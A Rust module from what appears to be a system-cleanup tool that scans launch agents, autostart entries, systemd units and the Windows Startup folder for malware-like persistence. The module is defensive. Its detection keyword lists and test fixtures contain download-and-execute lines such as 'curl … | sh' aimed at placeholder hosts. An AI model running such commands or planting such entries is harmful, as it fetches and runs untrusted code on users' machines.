//! Persistence audit (login items and background agents).

use std::fs;
use std::path::{Path, PathBuf};

use rustclean_safety::{Os, platform};

/// Where an item was found.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Source {
    UserLaunchAgent,
    SystemLaunchAgent,
    SystemLaunchDaemon,
    XdgAutostart,
    SystemdUserUnit,
    WindowsStartupFolder,
}

impl Source {
    pub fn label(self) -> &'static str {
        match self {
            Source::UserLaunchAgent => "User agent",
            Source::SystemLaunchAgent => "System agent",
            Source::SystemLaunchDaemon => "System daemon",
            Source::XdgAutostart => "Autostart entry",
            Source::SystemdUserUnit => "systemd user service",
            Source::WindowsStartupFolder => "Startup folder",
        }
    }
}

/// Severity of the strongest signal on an item.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Risk {
    /// Nothing unusual.
    Ok,
    /// Worth a look (e.g. leftover from an uninstalled app).
    Notice,
    /// Pattern commonly used by malware; review carefully.
    Warning,
}

impl Risk {
    pub fn label(self) -> &'static str {
        match self {
            Risk::Ok => "No signals",
            Risk::Notice => "Notice",
            Risk::Warning => "Review",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Finding {
    /// The program it starts no longer exists (often a leftover).
    ProgramMissing,
    /// Program lives in a temporary, download or shared folder.
    UnusualLocation(String),
    /// Program or definition file name is hidden (starts with '.').
    HiddenFile,
    /// Runs an interpreter with inline code (`sh -c`, `python -c`,
    /// `osascript -e`, ...).
    InlineScript(String),
    /// Downloads and executes content (`curl … | sh`).
    DownloadAndExecute,
    /// The definition file could not be parsed.
    Unreadable(String),
}

impl Finding {
    pub fn risk(&self) -> Risk {
        match self {
            Finding::ProgramMissing | Finding::Unreadable(_) => Risk::Notice,
            _ => Risk::Warning,
        }
    }

    pub fn describe(&self) -> String {
        match self {
            Finding::ProgramMissing => "program no longer exists (likely a leftover)".into(),
            Finding::UnusualLocation(w) => format!("program runs from {w}"),
            Finding::HiddenFile => "hidden file name".into(),
            Finding::InlineScript(i) => format!("runs inline {i} code"),
            Finding::DownloadAndExecute => "downloads and runs content from the internet".into(),
            Finding::Unreadable(e) => format!("definition could not be read: {e}"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct PersistenceItem {
    pub source: Source,
    pub label: String,
    /// The file that defines the item (plist, .desktop, unit, shortcut).
    pub definition: PathBuf,
    /// The program it starts, if determinable.
    pub program: Option<PathBuf>,
    pub arguments: Vec<String>,
    pub runs_at_load: bool,
    pub disabled: bool,
    pub findings: Vec<Finding>,
}

impl PersistenceItem {
    pub fn risk(&self) -> Risk {
        self.findings
            .iter()
            .map(Finding::risk)
            .max()
            .unwrap_or(Risk::Ok)
    }
}

#[derive(Debug, Clone, Default)]
pub struct PersistenceReport {
    pub items: Vec<PersistenceItem>,
    /// Locations that exist but could not be listed (permissions).
    pub unreadable_locations: Vec<PathBuf>,
}

impl PersistenceReport {
    pub fn count(&self, risk: Risk) -> usize {
        self.items.iter().filter(|i| i.risk() == risk).count()
    }
}

/// Scans every persistence location for this platform. Read-only.
pub fn scan_persistence(home: &Path) -> PersistenceReport {
    let mut report = PersistenceReport::default();
    for (source, dir) in locations(home) {
        let entries = match fs::read_dir(&dir) {
            Ok(e) => e,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(_) => {
                report.unreadable_locations.push(dir);
                continue;
            }
        };
        let mut paths: Vec<PathBuf> = entries.flatten().map(|e| e.path()).collect();
        paths.sort();
        for path in paths {
            if let Some(item) = read_item(source, &path) {
                report.items.push(item);
            }
        }
    }
    report
        .items
        .sort_by(|a, b| b.risk().cmp(&a.risk()).then(a.source.cmp(&b.source)));
    report
}

fn locations(home: &Path) -> Vec<(Source, PathBuf)> {
    match platform::CURRENT {
        Os::MacOs => vec![
            (Source::UserLaunchAgent, home.join("Library/LaunchAgents")),
            (
                Source::SystemLaunchAgent,
                PathBuf::from("/Library/LaunchAgents"),
            ),
            (
                Source::SystemLaunchDaemon,
                PathBuf::from("/Library/LaunchDaemons"),
            ),
        ],
        Os::Linux => {
            let config = std::env::var_os("XDG_CONFIG_HOME")
                .map(PathBuf::from)
                .filter(|p| p.is_absolute())
                .unwrap_or_else(|| home.join(".config"));
            vec![
                (Source::XdgAutostart, config.join("autostart")),
                (Source::XdgAutostart, PathBuf::from("/etc/xdg/autostart")),
                (Source::SystemdUserUnit, config.join("systemd/user")),
            ]
        }
        Os::Windows => {
            let roaming = std::env::var_os("APPDATA")
                .map(PathBuf::from)
                .unwrap_or_else(|| home.join(r"AppData\Roaming"));
            vec![(
                Source::WindowsStartupFolder,
                roaming.join(r"Microsoft\Windows\Start Menu\Programs\Startup"),
            )]
        }
        Os::Other => Vec::new(),
    }
}

fn read_item(source: Source, path: &Path) -> Option<PersistenceItem> {
    let name = path.file_name()?.to_string_lossy().into_owned();
    let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
    let parsed = match source {
        Source::UserLaunchAgent | Source::SystemLaunchAgent | Source::SystemLaunchDaemon => {
            if ext != "plist" {
                return None;
            }
            parse_launchd(path)
        }
        Source::XdgAutostart => {
            if ext != "desktop" {
                return None;
            }
            parse_ini(path, "Exec", "Hidden")
        }
        Source::SystemdUserUnit => {
            if !matches!(ext, "service" | "timer") {
                return None;
            }
            parse_ini(path, "ExecStart", "")
        }
        Source::WindowsStartupFolder => {
            if name.eq_ignore_ascii_case("desktop.ini") {
                return None;
            }
            // Shortcut targets need .lnk parsing; list the entry itself.
            Ok(Parsed {
                label: name.clone(),
                program: None,
                arguments: Vec::new(),
                runs_at_load: true,
                disabled: false,
            })
        }
    };
    let mut item = PersistenceItem {
        source,
        label: name.clone(),
        definition: path.to_path_buf(),
        program: None,
        arguments: Vec::new(),
        runs_at_load: false,
        disabled: false,
        findings: Vec::new(),
    };
    match parsed {
        Ok(p) => {
            item.label = p.label;
            item.program = p.program;
            item.arguments = p.arguments;
            item.runs_at_load = p.runs_at_load;
            item.disabled = p.disabled;
        }
        Err(e) => item.findings.push(Finding::Unreadable(e)),
    }
    if name.starts_with('.') {
        item.findings.push(Finding::HiddenFile);
    }
    let analysed = analyse(item.program.as_deref(), &item.arguments);
    item.findings.extend(analysed);
    Some(item)
}

struct Parsed {
    label: String,
    program: Option<PathBuf>,
    arguments: Vec<String>,
    runs_at_load: bool,
    disabled: bool,
}

fn parse_launchd(path: &Path) -> Result<Parsed, String> {
    let value = plist::Value::from_file(path).map_err(|e| e.to_string())?;
    let dict = value.as_dictionary().ok_or("not a dictionary")?;
    let s = |k: &str| dict.get(k).and_then(|v| v.as_string()).map(str::to_string);
    let b = |k: &str| dict.get(k).and_then(|v| v.as_boolean()).unwrap_or(false);
    let args: Vec<String> = dict
        .get("ProgramArguments")
        .and_then(|v| v.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|x| x.as_string().map(str::to_string))
                .collect()
        })
        .unwrap_or_default();
    let program = s("Program")
        .or_else(|| args.first().cloned())
        .map(PathBuf::from);
    let arguments = if s("Program").is_some() {
        args
    } else {
        args.into_iter().skip(1).collect()
    };
    Ok(Parsed {
        label: s("Label").unwrap_or_else(|| file_stem(path)),
        program,
        arguments,
        runs_at_load: b("RunAtLoad") || dict.get("KeepAlive").is_some(),
        disabled: b("Disabled"),
    })
}

/// Minimal `key=value` reader for `.desktop` files and systemd units.
fn parse_ini(path: &Path, exec_key: &str, hidden_key: &str) -> Result<Parsed, String> {
    let text = fs::read_to_string(path).map_err(|e| e.to_string())?;
    let mut exec = None;
    let mut label = None;
    let mut disabled = false;
    for line in text.lines() {
        let Some((k, v)) = line.split_once('=') else {
            continue;
        };
        let (k, v) = (k.trim(), v.trim());
        if k == exec_key && exec.is_none() {
            exec = Some(v.to_string());
        } else if k == "Name" && label.is_none() {
            label = Some(v.to_string());
        } else if !hidden_key.is_empty() && k == hidden_key {
            disabled = v.eq_ignore_ascii_case("true");
        } else if k == "X-GNOME-Autostart-enabled" && v.eq_ignore_ascii_case("false") {
            disabled = true;
        }
    }
    let words: Vec<String> = exec
        .as_deref()
        .unwrap_or("")
        // systemd prefixes such as '-' or '@' are not part of the path.
        .trim_start_matches(['-', '@', '+', '!', ':'])
        .split_whitespace()
        .map(str::to_string)
        .collect();
    Ok(Parsed {
        label: label.unwrap_or_else(|| file_stem(path)),
        program: words.first().map(PathBuf::from),
        arguments: words.into_iter().skip(1).collect(),
        runs_at_load: true,
        disabled,
    })
}

fn file_stem(path: &Path) -> String {
    path.file_stem()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_default()
}

/// Folders a legitimately installed program rarely runs from.
fn unusual_location(program: &Path) -> Option<String> {
    let s = program.to_string_lossy().replace('\\', "/").to_lowercase();
    let checks: &[(&str, &str)] = &[
        ("/tmp/", "a temporary folder"),
        ("/private/tmp/", "a temporary folder"),
        ("/var/tmp/", "a temporary folder"),
        ("/private/var/folders/", "a temporary folder"),
        ("/var/folders/", "a temporary folder"),
        ("/users/shared/", "the shared Users folder"),
        ("/downloads/", "the Downloads folder"),
        ("/appdata/local/temp/", "a temporary folder"),
        ("/dev/shm/", "shared memory"),
    ];
    checks
        .iter()
        .find(|(needle, _)| s.contains(needle))
        .map(|(_, what)| (*what).to_string())
}

const INTERPRETERS: &[(&str, &[&str])] = &[
    ("sh", &["-c"]),
    ("bash", &["-c"]),
    ("zsh", &["-c"]),
    ("dash", &["-c"]),
    ("python", &["-c"]),
    ("python3", &["-c"]),
    ("perl", &["-e"]),
    ("ruby", &["-e"]),
    ("osascript", &["-e"]),
    ("node", &["-e", "--eval"]),
    ("powershell", &["-command", "-c", "-encodedcommand", "-enc"]),
    (
        "powershell.exe",
        &["-command", "-c", "-encodedcommand", "-enc"],
    ),
    ("pwsh", &["-command", "-c", "-encodedcommand", "-enc"]),
    ("cmd.exe", &["/c"]),
];

/// Signals for a command line. Public for reuse and testing.
pub fn analyse_command(program: Option<&Path>, arguments: &[String]) -> Vec<Finding> {
    analyse(program, arguments)
}

fn analyse(program: Option<&Path>, arguments: &[String]) -> Vec<Finding> {
    let mut out = Vec::new();
    let Some(program) = program else {
        return out;
    };
    // Only absolute paths can be checked for existence; launchd also
    // resolves bare names via PATH.
    if program.is_absolute() && fs::symlink_metadata(program).is_err() {
        out.push(Finding::ProgramMissing);
    }
    if let Some(w) = unusual_location(program) {
        out.push(Finding::UnusualLocation(w));
    }
    if program
        .file_name()
        .is_some_and(|n| n.to_string_lossy().starts_with('.'))
    {
        out.push(Finding::HiddenFile);
    }
    let exe = program
        .file_name()
        .map(|n| n.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    if let Some((name, flags)) = INTERPRETERS.iter().find(|(n, _)| exe == *n)
        && arguments
            .iter()
            .any(|a| flags.contains(&a.to_lowercase().as_str()))
    {
        out.push(Finding::InlineScript((*name).to_string()));
    }
    let joined = arguments.join(" ").to_lowercase();
    let fetches = [
        "curl ",
        "wget ",
        "invoke-webrequest",
        "iwr ",
        "downloadstring",
    ]
    .iter()
    .any(|f| joined.contains(f));
    let executes = [
        "| sh",
        "|sh",
        "| bash",
        "|bash",
        "| python",
        "iex",
        "invoke-expression",
    ]
    .iter()
    .any(|x| joined.contains(x));
    if fetches && executes {
        out.push(Finding::DownloadAndExecute);
    }
    out.dedup();
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn flags_inline_scripts_and_download_execute() {
        let f = analyse(
            Some(Path::new("/bin/sh")),
            &args(&["-c", "curl -fsSL http://x.example/p | sh"]),
        );
        assert!(f.contains(&Finding::InlineScript("sh".into())), "{f:?}");
        assert!(f.contains(&Finding::DownloadAndExecute), "{f:?}");
        let f = analyse(
            Some(Path::new("/usr/bin/osascript")),
            &args(&["-e", "do shell script"]),
        );
        assert!(f.contains(&Finding::InlineScript("osascript".into())));
    }

    #[test]
    fn flags_unusual_locations_and_hidden_programs() {
        let f = analyse(Some(Path::new("/Users/Shared/.updater")), &[]);
        assert!(f.iter().any(|x| matches!(x, Finding::UnusualLocation(_))));
        assert!(f.contains(&Finding::HiddenFile));
        let f = analyse(Some(Path::new("/tmp/agent")), &[]);
        assert!(f.iter().any(|x| matches!(x, Finding::UnusualLocation(_))));
    }

    #[test]
    fn ordinary_program_has_no_signals_beyond_existence() {
        let f = analyse(Some(Path::new("/bin/ls")), &args(&["-la"]));
        assert!(f.is_empty() || f == vec![Finding::ProgramMissing], "{f:?}");
        let f = analyse(Some(Path::new("/definitely/not/here/agent")), &[]);
        assert_eq!(f, vec![Finding::ProgramMissing]);
    }

    #[test]
    fn parses_launchd_plist_and_ranks_by_risk() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path();
        fs::write(
            dir.join("com.example.good.plist"),
            r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>Label</key><string>com.example.good</string>
<key>ProgramArguments</key><array><string>/bin/ls</string><string>-la</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>"#,
        )
        .unwrap();
        fs::write(
            dir.join("com.example.bad.plist"),
            r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>Label</key><string>com.example.bad</string>
<key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>curl http://x | bash</string></array>
</dict></plist>"#,
        )
        .unwrap();
        fs::write(dir.join("broken.plist"), b"not a plist").unwrap();
        let good = read_item(Source::UserLaunchAgent, &dir.join("com.example.good.plist")).unwrap();
        assert_eq!(good.label, "com.example.good");
        assert_eq!(good.program.as_deref(), Some(Path::new("/bin/ls")));
        assert_eq!(good.arguments, args(&["-la"]));
        assert!(good.runs_at_load);
        let bad = read_item(Source::UserLaunchAgent, &dir.join("com.example.bad.plist")).unwrap();
        assert_eq!(bad.risk(), Risk::Warning);
        let broken = read_item(Source::UserLaunchAgent, &dir.join("broken.plist")).unwrap();
        assert!(matches!(broken.findings[0], Finding::Unreadable(_)));
        assert!(read_item(Source::UserLaunchAgent, &dir.join("ignored.txt")).is_none());
    }

    #[test]
    fn parses_desktop_and_systemd_entries() {
        let tmp = tempfile::tempdir().unwrap();
        let d = tmp.path().join("app.desktop");
        fs::write(&d, "[Desktop Entry]\nName=Syncer\nExec=/opt/syncer/bin/syncer --tray\nX-GNOME-Autostart-enabled=false\n").unwrap();
        let item = read_item(Source::XdgAutostart, &d).unwrap();
        assert_eq!(item.label, "Syncer");
        assert_eq!(
            item.program.as_deref(),
            Some(Path::new("/opt/syncer/bin/syncer"))
        );
        assert!(item.disabled);
        let u = tmp.path().join("x.service");
        fs::write(&u, "[Service]\nExecStart=-/tmp/.x/run\n").unwrap();
        let item = read_item(Source::SystemdUserUnit, &u).unwrap();
        assert_eq!(item.risk(), Risk::Warning);
    }
}
